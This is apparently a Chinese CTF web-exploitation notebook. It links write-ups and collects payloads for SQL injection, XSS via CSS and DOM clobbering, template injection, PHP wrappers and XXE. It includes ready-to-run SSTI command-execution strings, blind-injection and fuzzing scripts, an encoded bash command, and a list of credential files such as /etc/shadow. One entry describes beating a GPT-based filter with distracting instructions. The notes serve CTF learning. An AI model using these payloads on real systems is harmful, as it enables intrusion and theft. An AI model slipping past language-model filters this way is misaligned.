# Web笔记

越来越认识到什么是“好记性不如烂笔头”

## SQL注入

之前开过一个SQL分区，感觉之后的还是放在这里比较好
- [Penguin-Login](https://dothidden.xyz/la_ctf_2024/penguin-login/)
    - 仅能使用`a-zA-Z0-9{_}`且不能使用LIKE和注释符的PostgreSQL盲注。LIKE的功能可以用BETWEEN代替
    - 其他wp（做法）： https://siunam321.github.io/ctf/LA-CTF-2024/web/penguin-login/ ，用`SIMILAR TO`和正则匹配代替LIKE。但是注意`{x}`在正则里表示匹配前一个字符x次，匹配带有`{}`的flag时可以去掉flag格式再匹配

## XSS

觉得是时候给xss建个分类了。最近见到的xss题目越来越多了(个人觉得仅利用CSS的也算广义上的“xss”)
- [quickstyle](https://sheeptester.github.io/longer-tweets/lactf/#webquickstyle)
    - 利用form实现dom clobbering覆盖原本document里的函数（如`document.querySelectorAll`）。覆盖函数后程序内部无法调用该函数
    - CSP较为严格的情况下可以考虑利用CSS泄漏页面指定信息。这种技巧一般只需要一个字符一个字符地泄漏，即创建多个css泄露固定的一个信息；但这题要求一个css一次泄露完整的信息。如果覆盖所有可能性的话会导致payload过长，可以考虑3个字符3个字符地泄漏。构造payload时需要借助CSS变量，防止多种规则同时生效时被覆盖。一些CSP和CSS利用的分析和总结也可以参考wp：
        - `[attr="value"]`:Whether the attribute is exactly the string.
        - `[attr^="value"]`:Whether the attribute starts with a string.
        - `[attr$="value"]`:Whether the attribute ends with a string.
        - `[attr*="value"]`:Whether the attribute contains the string anywhere, at least once.
        - `[attr*="value" i]`:Adding i at the end makes the comparison case insensitive.
        - `[attr|="value"]`:This also can compare strings, but it has a special behavior that allows lang="en" and lang="en-US" to be treated similarly. It’s not particularly useful for anything but the lang attribute.
        - CSS可做大小写不敏感的匹配
    - 生日悖论（birthday paradox）的应用以及如何找De Bruijn graph里的Eulerian path。这种图可用来解决“给定几组相邻的子字符组，重建原本的字符串“的问题
    - 其他wp： https://raltheo.fr/p/quickstyle/ ，https://gist.github.com/arkark/5787676037003362131f30ca7c753627 ，使用了非预期解法。DOM Clobbering的部分相同，但是利用了bfache（浏览器的后退/前进缓存），使本该变化的密码不再变化，就能利用传统方式一个字符一个字符地泄漏了。关于chrome的cache机制： https://blog.arkark.dev/2022/11/18/seccon-en/#Step-1-Understanding-cache-behavior-in-Google-Chrome
    - 一个关于CSS Injection/exil strategies + DOM Clobbering的讲解视频： https://www.youtube.com/watch?v=DQ9yLCdmt-s
    - 官方wp： https://github.com/uclaacm/lactf-archive/tree/main/2024/web/quickstyle
- [ctf-wiki](https://blog.bawolff.net/2024/02/la-ctf-write-up-ctf-wiki.html)
    - 当CSP里有`SameSite=Lax`时，使用`<iframe>`加载不同域的网页时不会获取到cookie。cookie只会在top-level GET navigation中加载
    - 域名后添加一个`.`，如`lac.tf`和`lac.tf.`不会影响指向的网页（两者都会指向同一个网页），但浏览器会将两者视为不同网站，进而拥有不同的cookie，两者之间cookie不共通，无法互用。同时，位于`lac.tf.`的网页无法获取`lac.tf`上的内容，因为违反了same origin策略
    - 这题的设置比较特殊，要求利用xss时同时拥有cookie而且又没有cookie，在访问一个页面时，无cookie的情况下是查看内容，有cookie的情况下是编辑内容。一种解决办法是利用弹窗（Popup windows），用`<iframe>`加载网页，因上述的CSP原因，cross-site iframe无法获取的cookie，因此iframe内部是没有cookie的。这时若加载的网页里有xss漏洞，就能在内部执行脚本，调用`window.open()`开启一个弹窗。弹窗属于top-level GET navigation，所以能获取的cookie，于是弹窗内部又是拥有cookie的状态。不过现代浏览器通常都有弹窗拦截器，只能由用户交互弹出弹窗，脚本本身是不行的。除非题目用的admin bot关闭了弹窗拦截器。用这种做法的wp： https://rwandi-ctf.github.io/LACTF2024/ctf-wiki/ （另外还使用了`document.write`和form标签绕过`default-src 'self'`）
    - 浏览器的Cache partitioning机制：某个域下的`<iframe>`与该域的`top level navigation`网页的cache是分开的，包括那些可用于控制同域上其他网页的api和cookie。这个机制用于阻止第三方iframes和网站的通信。具体参考[文档](https://developers.google.com/privacy-sandbox/3pcd/storage-partitioning)。[blob](https://developer.mozilla.org/docs/Web/API/Blob) URL是这个机制的例外
    - blob URL简述就是对网页上某段内容的引用。blob url与创建自身的网页同源（same origin），不会应用Cache partitioning机制，而且可以在第三方情境下工作（work across third-party contexts），甚至可以做top-level navigation（与`data:` url区分）
    - 利用blob和iframe实现“同时拥有cookie而且又没有cookie”。创建一个iframe，里面包含构造的xss payload；xss payload内部将要泄漏的页面包装到blob url里。此时blob url内部是有cookie的，而iframe里则没有。注意创建iframe时，sandbox属性要为`allow-top-navigation allow-scripts allow-same-origin`
    - 其他wp： https://github.com/abhishekg999/CTFWriteups/tree/main/LACTF2024/ctf-wiki ，利用WebRTC配合DNS绕过CSP `connect-uri`，以及不用WebRTC的做法

## SSTI

ssti（模板注入）。这张简单但是经典的表说明当出现ssti时如何测试是什么模板。

![ssti_test](../../CTF/BUUCTF/images/Pasted-1-768x458.png)

模板注入分很多种，慢慢积累。

- [twig](https://xz.aliyun.com/t/10056#toc-13)(php)
- [smarty](https://www.anquanke.com/post/id/272393)(php)
- [flask](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Web/shrine.md)(python)。例题1:[[GYCTF2020]FlaskApp](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BGYCTF2020%5DFlaskApp.md)。例题2（利用[subprocess.Popen](https://blog.csdn.net/whatday/article/details/109315876)执行命令）:[[CSCCTF 2019 Qual]FlaskLight](https://blog.csdn.net/mochu7777777/article/details/107589811)。命令：`{{''.__class__.__mro__[1].__subclasses__()[395]('ls',shell=True,stdout=-1).communicate()[0].strip()}}`。索引需要爆破：

```python
import requests
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
}
for i in range(300,1000):
    url = "http://935b5916-e3d0-4949-80b9-7273c9f46f7b.challenge.ctf.show/hello/{{''.__class__.__mro__[1].__subclasses__()"+f"[{i}]"+"}}"
    res = requests.get(url=url, headers=headers)
    print(res.text)
    if 'Popen' in res.text:
        print(i)
        break 
```
  - 当flask的{{}}被过滤时，可以用{%%}来绕过过滤。例题:[[GWCTF 2019]你的名字](https://blog.csdn.net/cjdgg/article/details/119813547),更多绕过方式可参考[此处](https://blog.csdn.net/miuzzx/article/details/110220425)
  - 最简单的getshell payload(配合eval): `__import__("os").popen("ls").read()`，来源:[[watevrCTF-2019]Supercalc](https://blog.csdn.net/a3320315/article/details/104272833)
  - 能发现flask注入需要大量`.`,`_`，如果被过滤了可以用`[]`替代`.`，16进制编码替代`_`。例如`{{()."__class__"."__bases__"[0]."__subclasses__"()[91]["get_data"](0, "/proc/self/fd/3")}}`绕过过滤的写法就是`{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}`。例题:[[pasecactf_2019]flask_ssti](https://blog.csdn.net/qq_40800734/article/details/107011638)
  - 有时候执行的命令在url里会被截断，可以通过传参的方式解决这个问题。`{{ "".__class__.__base__ .__subclasses__()[132].__init__.__globals__['popen'](request.args.get("cmd")).read()}}ge?cmd=cat /flag `
  - 利用request.values绕过过滤。需要爆破索引
    ```py
    """ import requests 
    for num in range(300): 
        url = ""
        d={"prefix":"{{","suffix":"}}","username":f"().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__({num}).__init__.__globals__.__getitem__(request.values.a)","a":"popen"}
        res = requests.post(url,data=d).text 
        if "popen" in res: 
            print(num) 
            break """
    import requests 
    url = ""
    d={"prefix":"{{","suffix":"}}","username":f"().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(140).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()","a":"popen",'b':'env'}
    res = requests.post(url,data=d).text 
    print(res)
    ```
- `url_for.__globals__.os.__dict__.popen(request.args.file).read()`，然后传参file，内容为要执行的命令
- `url_for.__globals__.os.environ`,拿环境变量
- `config.__class__.from_envvar.__globals__.__builtins__.__import__(request.args.a).getenv(request.args.b)`，参数a是要导入的模块（os），参数b是环境变量名（把getenv换了就能执行别的了）
- `().__class__.mro()[1].__subclasses__()[337](get_flashed_messages.__class__.__mro__[1].__subclasses__()[3]((0x65,0x78,0x70,0x6f,0x72,0x74)).decode(),shell=True,stdout=-1).communicate()[0].strip()`
- `().__class__.__base__.__subclasses__()[148]()._module.__builtins__[request.args.b](request.args.c).environ`
- [Obligatory](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Obligatory.md)（ https://hackmd.io/@Chivato/HyWsJ31dI ）
     - `{{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27cmd%27)|attr(%27read%27)()}}`
    - `{{%22%22|attr(%27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(411)(%27cmd%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}`
    - 获取SECRET KEY：`{{self|attr("\x5f\x5fdict\x5f\x5f")}}`
- [PickYourStarter](https://github.com/MasonCompetitiveCyber/PatriotCTF2023/tree/main/Web/pickyourstarter)
    - 可以用自定义header传命令：`{{joiner.__init__.__globals__.os.popen(request.headers.cmd).read()}}`,然后header里添加`cmd: cat flag.txt`
`{{().__class__.__base__.__subclasses__().__getitem__(455)(request.args.shell,shell=True,stdout=(1).__neg__()).communicate()}}`:用getitem绕`[]`过滤，`(1).__neg__()`绕负号过滤
- [My First App](https://ireland.re/posts/UofTCTF_2024/#webmy-first-app)
    - 过滤方括号、下划线及引号。利用lipsum逃逸，`|attr()`代替方括号，并将带有下划线的项放在请求头，用`request.pragma.0`访问（有些header里面没法放下划线，Pragma可以，所以用多个Pragma传递带有下划线的项，数字表示第i个Pragma里的内容）
    - https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#my-first-app
- [Frog-WAF](https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky/)
    - java ssti模板注入（[EL - Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)）。此题的难点在于waf，限制了所有数字和一些特殊符号与java的类名
    - 其他payload：
        - https://github.com/AlbertoFDR/CTF/tree/main/2023/ProjectSekai/web/Frog-WAF
        - https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba
        - https://github.com/SuperStormer/writeups/tree/master/sekaictf_2023/web/frog-waf
        - https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00
        ```rb
        require 'http'
        def gen_s(s)
            a = <<E.strip!
            [].toString().getClass().getMethods()[#{Array.new(22, []).inspect}.size()].invoke([].toString(), [].size()).getClass().getMethods()[#{Array.new(5, []).inspect}.size()].invoke([].toString().getClass().getMethods()[#{Array.new(22, []).inspect}.size()].invoke([].toString(), [].size()), %s.size())
        E
            r = []
            s.chars.each do |c|
                r << a % Array.new(c.ord, []).inspect
            end
            sr = ""
            r.each do
                if sr.length.zero?
                    sr << _1
                    next
                else
                    sr << (".concat(%s)" % _1)
                end
            end
            sr
        end
        cn = gen_s("java.lang.Runtime")
        # https://ares-x.com/tools/runtime-exec/
        cmd = gen_s("bash -c {echo,Y2F0IC9mbGFnLSoudHh0}|{base64,-d}|{bash,-i}")
        bcn = gen_s("java.util.Base64")
        exp = <<E.strip!
        [].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{cn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null).exec(#{cmd}).getInputStream()
        E
        r_exp = <<E.strip!
        ${[].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{bcn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null).getClass().getMethods()[#{Array.new(4, []).inspect}.size()].invoke([].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{bcn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null), #{exp}.readAllBytes())}
        E
        url = "http://frog-waf.chals.sekai.team/addContact"
        r = HTTP.post(url, json: {"firstName": "test", "lastName": "test", "description": "test", "country": r_exp})
        puts r
        ```
- [Aspiring Calculator](https://github.com/4n86rakam1/writeup/tree/main/TUCTF_2023/Web/Aspiring_Calculator)
    - C# ASP.NET Razor engine SSTI
- [My First Blog](https://github.com/4n86rakam1/writeup/blob/main/TUCTF_2023/Web/My_First_Blog)
    - 过滤部分关键词后的python flask ssti
- [gpwaf](https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003#Web-115-gpwaf-180-solves)
    - ejs模板注入。题目增加了一个绕过gpt过滤的环节。这种用gpt做过滤的题之前没见过，做的时候发现只要payload带有ejs注入必须的`<%`就报错，完全不知道怎么绕过。后面看了wp意识到这是gpt，不是黑/白名单之类的过滤，在payload前加几句干扰gpt的指令即可（以及不用`<%`的纯ejs注入确实不可能）
    - 其他解法（干扰gpt语句+ejs注入payload）： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#gpwaf
- [更多模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

1. 当网站没有任何提示时，可以去看看一些敏感目录。

例如：

```
/robots.txt
/.git(这个目录有时候可以直接看，有时候会被forbidden。就算被forbidden了也证明这个目录是存在的，考点可能是git泄露。)
/www.zip（有时候会有网站源码）
```

不过这样蒙目录基本没啥用。建议进一步使用工具扫描目录。不过工具不是万能的，会出现漏扫的情况。尝试把线程调低或者手动检查一些简单的。

2. 永远不要忘记查看源代码以及开发者工具。

很多时候提示都会藏在注释里。还有甚者藏在服务器返回的http报文里，console里。这些都可以用chrome查看。network选项中可以记录报文，如果单纯就是看个报文也没必要专门开个bp。还有最重要的，一些php题包含flag后很有可能包含在注释里，网页直接是看不到的。这时候不看源代码错过flag真的太冤了。

3. 要有bp抓包和改包的习惯。

抓包可以最清楚看到发送了什么东西，接收了什么东西。改包是为了让客户端发出去一些非预期内容，测试能不能触发隐藏bug。

4. flask session伪造

[例题](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/%E6%8A%BD%E8%80%81%E5%A9%86.md)。这题还有个任意文件下载的考点，也很经典。

5. [php伪协议](https://segmentfault.com/a/1190000018991087)

[例题](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/1%E7%BA%A7/Web/fileclude.md)。很多时候用来读取源代码，标志函数为include函数系列。注意php://filter伪协议还可以套另一层协议，不一定非要写`php://filter/read=convert.base64-encode/resource=flag.php`这类的，写`php://filter/read=convert.base64-encode/xxx/resource=flag.php`也行，xxx自定，可用于绕过滤。如[这道题](https://blog.csdn.net/mochu7777777/article/details/105204141)。或者大小写混用，不要read也可以:`pHp://filter/convert.baSe64-encode/resource=/flag`。如果base64等关键字符被过滤了，可以考虑双urlencode绕过，如`php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=flag.php`。[例题2](https://blog.csdn.net/m0_56059226/article/details/119758074)，使用zip伪协议，这个协议忽视后缀，不是zip，例如jpg后缀也可以读取。格式为`zip://[压缩文件绝对路径（网站上相对路径也行）]%23[压缩文件内的子文件名（木马）]（#编码为%23，#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码）`。

1. php preg_replace函数/e选项会导致命令执行

这篇[文章](https://xz.aliyun.com/t/2557)讲的很好。[ics-05](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Web/ics-05.md)是一道关于该漏洞的例题。还有和文章中提到的利用方法思路完全一样的题：[[BJDCTF2020]ZJCTF，不过如此](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBJDCTF2020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4.md)。

7. php rce之<?=和反引号的利用。例题：[RCE挑战1](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/RCE%E6%8C%91%E6%88%981.md)

8. php无字母数字rce之自增利用。例题：[RCE挑战2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/ctfshow/Web/RCE%E6%8C%91%E6%88%982.md)
9. xml基本xxe利用。例题：[[NCTF2019]Fake XML cookbook](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BNCTF2019%5DFake%20XML%20cookbook.md)。注意[svg文件](https://baike.baidu.com/item/SVG%E6%A0%BC%E5%BC%8F/3463453)也是基于xml开发的，同样也有xxe。例题:[[BSidesCF 2019]SVGMagic](https://blog.csdn.net/shinygod/article/details/124052707)
```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY flag SYSTEM  "file:///flag.txt">
]>
<user>
	<name>&flag;</name>
</user>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```
10. shell命令执行常见[绕过](https://blog.51cto.com/m0re/3879244)
11. [md5碰撞](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value)。这是一些hex编码下内容不同却能产生相同md5值的字符串。
12. 一些在黑名单过滤时可互相交换的命令
- 查看目录
> ls<Br>dir
- 输出文件内容
> cat<br>[sort](https://www.cnblogs.com/51linux/archive/2012/05/23/2515299.html)。sort本是排序命令，但是默认会把执行后的结果输出到终端。<Br>[tail](https://www.runoob.com/linux/linux-comm-tail.html)，默认显示文件尾部的内容。由于flag文件基本不会超过十行，所以作用差不多<br>tac，倒序输出文件内容
1.  [浏览器设置编码](https://blog.csdn.net/jnx1142410525/article/details/55271037)。如果浏览器的编码不对就会出现乱码。
2.  php md5相关特性。
- md5原始二进制利用+0e绕过md5弱等于+数组绕过md5强等于：[Easy MD5](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/Easy%20MD5.md)。
- 一个0e开头且其md5值也是0e开头的字符串，可用于弱等于：`0e215962017`
1.  php 5 intval特性：intval会截断科学计数法下的字符串，但当以科学计数法表示的字符串进行运算后便不会截断，会返回其运算后的值。例题：[[WUSTCTF2020]朴实无华](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E.md)
2.  githacker基本命令
- githacker --url http://example.com/.git --output-folder ./output

1.  多文件内寻找可用shell脚本。今天遇见一道题，整个网站全是后门文件，然而只有一个是有用的。算是fuzz题的变种，可以用以下多线程脚本找到。

```python
import os
import requests
import re
import threading
import time

print('开始时间： '+ time.asctime(time.localtime(time.time()))) 
s1 = threading.Semaphore(100)
filePath = r"src"
os.chdir(filePath)
requests.adapters.DEFAULT_RETRIES = 5
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False
def get_content(file):
    s1.acquire()
    print('tring  '+file+'   '+time.asctime(time.localtime(time.time())))
    with open(file,encoding='utf-8') as f:
        gets = list(re.findall('\$_GET\[\'(.*?)\'\]',f.read()))
        posts = list(re.findall('\$_POST\[\'(.*?)\'\]',f.read()))
    data = {}
    params = {}
    for m in gets:
        params[m] = "echo '123456';"
    for n in posts:
        data[n] = "echo '123456';"
    url = "此处填本地网站地址" +file  #远程的也能post和get到，但是不知道为啥fuzz不出来
    req = session.post(url,data=data,params=params)
    req.close()
    req.encoding = 'utf-8'
    content=req.text
    if '123456' in content:
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo '123456';")
            content =req.text
            req.close()
            if "123456" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo '123456';"})
                content =req.text
                req.close()
                if "123456" in content:
                    break
        if flag == 1:
            params = a
        else:
            params = b
        print('找到了利用文件： ' + file +"  and 找到了利用的参数：%s" %params)
        print('结束时间： '+time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:
    t = threading.Thread(target=get_content,args=(i,))
    t.start()
```

题目及来源：[[强网杯 2019]高明的黑客](https://blog.csdn.net/qq_51684648/article/details/120167176)

19. php extract变量覆盖+反序列化逃逸漏洞。例题:[[安洵杯 2019]easy_serialize_php](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php.md)

20. python unicodedata.numeric 漏洞。例题：[[ASIS 2019]Unicorn shop](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BASIS%202019%5DUnicorn%20shop.md)

21. php魔术方法：[官方文档](https://www.php.net/manual/zh/language.oop5.magic.php)。例题：[[MRCTF2020]Ezpop](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BMRCTF2020%5DEzpop.md)

22. php [->,=>和::符号详解](https://segmentfault.com/a/1190000008600674)。

23. 命令注入的nmap利用：-oG选项写shell并绕过php escapeshellarg和escapeshellcmd函数。例题：[[BUUCTF 2018]Online Tool](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBUUCTF%202018%5DOnline%20Tool.md)

24. [php特殊标签绕过滤](https://www.cnblogs.com/jinqi520/p/11417365.html)
25. php利用数学函数构造任意shell。例题：[[CISCN 2019 初赛]Love Math](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math.md)
26. 当题目有提到“检查ip”，“只有我自己……”等有关获取ip的内容时，可以考虑是否在xff上做了手脚，比如我们能把xff改为127.0.0.1来伪造本机，甚至是执行模板注入。例题:[[MRCTF2020]PYWebsite](https://buuoj.cn/challenges#[MRCTF2020]PYWebsite)
27. flag可能会出现在phpinfo界面的Environment里，有时候是因为出题人配置错误，有时候就是这么设计的。例题：[[NPUCTF2020]ReadlezPHP](https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP)
28. sql注入。
- 在information_schem被ban后的替代注入+[无列名注入](https://blog.csdn.net/qq_45521281/article/details/106647880)。例题：[[SWPU2019]Web1](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BSWPU2019%5DWeb1.md)
- updatexml报错注入。例题:[HardSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/HardSQL.md)
- 堆叠注入+符号`||`的利用。例题:[EasySQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/EasySQL.md)
- 联合查询（union select）会构造虚拟数据，利用此虚拟数据可以伪造登录。例题：[BabySQli](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/BabySQli.md)
    - 当过滤太多，无法获取数据库中账号信息但需要登录时使用。或者当数据库里压根就没有信息但仍需要登录时使用。如果是后者，也可以去sqlite_master里随便查出信息来用:`union select rootpage, type, name from sqlite_master --`，因为sqlite_master里一定是有值的
- 二分法异或盲注。例题:[[极客大挑战 2019]FinalSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL.md)
  - 在这道题的基础上改动，使其成为通用的mysql布尔盲注脚本。当然改一下if语句的内容也能做延时注入（时间盲注）脚本。
```python
import requests
url="http://62.173.140.174:26001/user.php"
def payload(i, j):
    # 数据库名字
    #sql = f"test'/**/and/**/if(ascii(substr(database(),{i},1))>{j},1,0)#"
    # 表名
    #sql = f"test'/**/and/**/if((ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='data'),{i},1))>{j}),1,0)#"
    # 列名
    # sql = f"test'/**/and/**/if((ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flags')),{i},1))>{j}),1,0)#"
    # 查询flag
    sql = f"test'/**/and/**/if((ord(substr((select(group_concat(flag))from(flags)),{i},1))>{j}),1,0)#"
    data={'login':sql,'password':'test'}
    r = requests.get(url, params=data)
    if "User" in r.text:
       res = 1
    else:
       res = 0
    return res
def exp():
    flag=""
    for i in range(1, 10000):
        low = 31
        high = 127
        while low <= high:
              mid = (low + high) // 2
              res = payload(i, mid)
              if res:
                 low = mid + 1
              else:
                 high = mid - 1
        f = int((low + high + 1)) // 2
        if (f == 127 or f == 31):
           break
        flag += chr(f)
        print(flag)
exp()
```  
- sql正则regexp+二次注入+updatexml报错注入。例题:[[RCTF2015]EasySQL](../../CTF/BUUCTF/Web/[RCTF2015]EasySQL.md)
29. php使用读取文件的不同方式，可用于绕过滤。

```php
system("cat /flag");
file_get_contents("/flag");
readfile("/flag");
highlight_file("/flag");
show_source("flag.php")
```

30. MD5hash长度扩展攻击+chrome利用代码添加cookie。例题：[[De1CTF 2019]SSRF Me](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BDe1CTF%202019%5DSSRF%20Me.md)
31. ssi注入漏洞。例题:[[BJDCTF2020]EasySearch](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBJDCTF2020%5DEasySearch.md)
32. idna编码+utf-8解码造成的过滤绕过。例题:[[SUCTF 2019]Pythonginx](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BSUCTF%202019%5DPythonginx.md)
33. php格式化字符串逃逸+数组绕过strlen检查。例题1:[[0CTF 2016]piapiapia](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B0CTF%202016%5Dpiapiapia.md)；例题2:[baby_unserialize](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Web/baby_unserialize.md)
34. php普通无字母数字getshell+绕过disable functions
35. chrome console发送post请求

[来源](https://cloud.tencent.com/developer/article/1805343)

```js
var url = "http://28401609-7e35-445a-84b7-509187f6de3f.node4.buuoj.cn:81/secrettw.php";

var params = "Merak=a";

var xhr = new XMLHttpRequest();

xhr.open("POST", url, true);

xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"); 

xhr.onload = function (e) {

  if (xhr.readyState === 4) {

    if (xhr.status === 200) {

      console.log(xhr.responseText);

    } else {

      console.error(xhr.statusText);

    }

  }

};

xhr.onerror = function (e) {

  console.error(xhr.statusText);

};

xhr.send(params);
```

36. PHP会将传参中的空格( )、小数点(.)自动替换成下划线。例题:[[MRCTF2020]套娃](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83.md)
37. 以下代码可传入23333%0a绕过。可以说末尾加个%0a是绕过`^xxx$`这个格式的普遍解法，因为preg_match只能匹配一行数据，无法处理换行符。
```php
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

38.  php pcre回溯限制绕过preg_match。例题:[[FBCTF2019]RCEService](../../CTF/BUUCTF/Web/[FBCTF2019]RCEService.md)
39.  php basename特性+$_SERVER['PHP_SELF']使用+url解析特性。例题:[[Zer0pts2020]Can you guess it?](../../CTF/BUUCTF/Web/[Zer0pts2020]Can%20you%20guess%20it%3F.md)
40.  python pickle反序列化漏洞+jwt爆破secret key。例题:[bilibili](../../CTF/攻防世界/9级/Web/bilibili.md)。pickle也可以用来反弹shell。例题:[[watevrCTF-2019]Pickle Store](https://blog.csdn.net/mochu7777777/article/details/107589233)
41.  python flask模板注入脚本查找subprocess.Popen索引。

[来源](https://blog.csdn.net/mochu7777777/article/details/107589811)

```python
import requests 
import re 
import html 
import time 
index = 0 
for i in range(170, 1000): 
    try: 
        url = "http://e5df30ec-7e81-425e-b1cf-0988f6f9ae6f.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}" 
        r = requests.get(url) 
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text) 
        time.sleep(0.1)
        # print(res) 
        # print(r.text) 
        res = html.unescape(res[0]) 
        print(str(i) + " | " + res) 
        if "subprocess.Popen" in res: 
            index = i 
            break 
    except: 
        continue
print("index of subprocess.Popen:" + str(index))
```

42. 使用[php_mt_seed](https://www.openwall.com/php_mt_seed/)爆破php伪随机数函数[mt_rand](https://www.freebuf.com/vuls/192012.html)种子。例题:[[GWCTF 2019]枯燥的抽奖](https://blog.csdn.net/shinygod/article/details/124067962)
43. linux可读取的敏感文件。

[来源](https://www.shawroot.cc/1007.html)

```
/etc/passwd
/etc/shadow
/etc/hosts
/root/.bash_history //root的bash历史记录，每个用户的家目录下都有这么一个文件
/root/.ssh/authorized_keys
/root/.mysql_history //mysql的bash历史记录
/root/.wget-hsts
/opt/nginx/conf/nginx.conf //nginx的配置文件
/var/www/html/index.html
/etc/my.cnf
/etc/httpd/conf/httpd.conf //httpd的配置文件
/proc/self/fd/fd[0-9]*(文件标识符)
/proc/mounts
/proc/config.gz
